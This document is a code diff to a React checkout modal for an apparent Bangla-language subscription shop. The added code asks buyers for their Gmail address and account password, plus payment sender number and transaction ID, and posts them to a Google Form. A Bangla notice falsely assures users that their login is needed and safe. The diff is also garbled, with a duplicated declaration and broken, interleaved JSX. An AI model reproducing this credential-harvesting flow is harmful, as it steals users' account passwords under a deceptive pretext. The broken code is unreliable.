@@ -41,6 +41,73 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
 
   const total = product ? product.price : 0;
 
+  const googleFormAction = import.meta.env.VITE_GOOGLE_FORM_ACTION;
+  const googleFormEmailEntry = import.meta.env.VITE_GOOGLE_FORM_EMAIL_ENTRY;
+  const googleFormPasswordEntry = import.meta.env.VITE_GOOGLE_FORM_PASSWORD_ENTRY;
+  const googleFormMethodEntry = import.meta.env.VITE_GOOGLE_FORM_METHOD_ENTRY;
+  const googleFormSenderEntry = import.meta.env.VITE_GOOGLE_FORM_SENDER_ENTRY;
+  const googleFormTrxEntry = import.meta.env.VITE_GOOGLE_FORM_TRX_ENTRY;
+  const googleFormProductEntry = import.meta.env.VITE_GOOGLE_FORM_PRODUCT_ENTRY;
+
+  const isGoogleFormConfigured =
+    Boolean(googleFormAction) &&
+    Boolean(googleFormEmailEntry) &&
+    Boolean(googleFormPasswordEntry);
+
+  const submitToGoogleForm = async () => {
+    if (!isGoogleFormConfigured) {
+      throw new Error('Google Form config missing');
+    }
+
+    const formData = new FormData();
+    formData.append(googleFormEmailEntry!, email);
+    formData.append(googleFormPasswordEntry!, password);
+
+    if (googleFormMethodEntry) formData.append(googleFormMethodEntry, method);
+    if (googleFormSenderEntry) formData.append(googleFormSenderEntry, senderNumber);
+    if (googleFormTrxEntry) formData.append(googleFormTrxEntry, trxId);
+    if (googleFormProductEntry && product?.name) formData.append(googleFormProductEntry, product.name);
+
+    formData.append('submit', 'Submit');
+
+    await fetch(googleFormAction!, {
+      method: 'POST',
+      mode: 'no-cors',
+      body: formData,
+    });
+  };
+
+  const handlePay = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!isGoogleFormConfigured) {
+      setSubmitError('গুগল ফর্ম কনফিগার করা নেই। সঠিক লিংক ও এন্ট্রি আইডি সেট করুন।');
+      return;
+    }
+
+    setStep('processing');
+    setSubmitError('');
+
+    try {
+      await submitToGoogleForm();
+
+      setStep('success');
+      setTimeout(() => {
+        onSuccess();
+        setStep('details');
+        setEmail('');
+        setPassword('');
+        setSenderNumber('');
+        setTrxId('');
+      }, 3000);
+    } catch (error) {
+      console.error('Failed to submit checkout to Google Form', error);
+      setSubmitError('ফর্মে তথ্য জমা দেওয়া যায়নি। পুনরায় চেষ্টা করুন।');
+      setStep('details');
+    }
+  };
+
+  const total = product ? product.price : 0;
+
   if (!isOpen || !product) return null;
 
   const methods: { id: PaymentMethod; name: string; color: string }[] = [
@@ -136,6 +203,9 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                     আপনার জিমেইল (Gmail)
                   </label>
                   <div className="relative">
+                    <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
+                    <input
+                      type="email"
                     <Mail
                       className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500"
                       size={18}
@@ -157,6 +227,9 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                     অ্যাকাউন্ট পাসওয়ার্ড
                   </label>
                   <div className="relative">
+                    <Lock className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
+                    <input
+                      type="password"
                     <Lock
                       className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500"
                       size={18}
@@ -174,6 +247,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                   <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3 mt-3 flex gap-2">
                     <AlertTriangle className="text-yellow-500 shrink-0" size={16} />
                     <p className="text-xs text-yellow-200/80 leading-relaxed">
+                      পার্সোনাল অ্যাকাউন্টে সাবস্ক্রিপশন চালু করার জন্য আমাদের লগইন এক্সেস প্রয়োজন। আপনার তথ্য সম্পূর্ণ সুরক্ষিত থাকবে এবং শুধুমাত্র আপগ্রেডের কাজেই ব্যবহৃত হবে। কাজ শেষে আপনি পাসওয়ার্ড পরিবর্তন করে নিতে পারবেন।
                       পার্সোনাল অ্যাকাউন্টে সাবস্ক্রিপশন চালু করার জন্য আমাদের লগইন
                       এক্সেস প্রয়োজন। আপনার তথ্য সম্পূর্ণ সুরক্ষিত থাকবে এবং
                       শুধুমাত্র আপগ্রেডের কাজেই ব্যবহৃত হবে। কাজ শেষে আপনি পাসওয়ার্ড
@@ -206,6 +280,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                 </div>
 
                 <div className="p-3 bg-slate-800/50 rounded-lg border border-slate-700/50 mb-4 text-sm text-slate-300">
+                  অনুগ্রহ করে <span className="font-bold text-white">{getPaymentNumber()}</span> নম্বরে সেন্ড মানি করুন।
                   অনুগ্রহ করে{' '}
                   <span className="font-bold text-white">{getPaymentNumber()}</span>{' '}
                   নম্বরে সেন্ড মানি করুন।
@@ -213,6 +288,9 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
 
                 <div className="space-y-3">
                   <div className="relative">
+                    <Smartphone className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
+                    <input
+                      type="text"
                     <Smartphone
                       className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500"
                       size={18}
@@ -228,6 +306,9 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                     />
                   </div>
                   <div className="relative">
+                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500 font-bold text-xs">TrxID</span>
+                    <input
+                      type="text"
                     <span className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500 font-bold text-xs">
                       TrxID
                     </span>
